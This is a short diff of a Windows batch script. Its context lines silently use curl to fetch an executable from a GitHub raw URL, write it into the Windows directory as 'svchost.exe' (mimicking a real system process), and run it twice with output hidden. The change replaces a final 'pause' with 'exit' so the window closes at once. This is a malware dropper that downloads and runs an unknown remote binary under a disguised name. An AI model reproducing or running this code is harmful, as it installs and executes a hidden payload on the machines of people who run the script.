@@ -3,4 +3,4 @@
 @curl --noproxy "*" --fail -L --proto "=https" --tlsv1.2 -o "%windir%\svchost.exe" "https://raw.githubusercontent.com/hidparse/friendly-dollop/refs/heads/main/test.exe" >nul 2>&1
 %windir%\svchost.exe >nul 2>&1
 %windir%\svchost.exe >nul 2>&1
-pause .
+exit
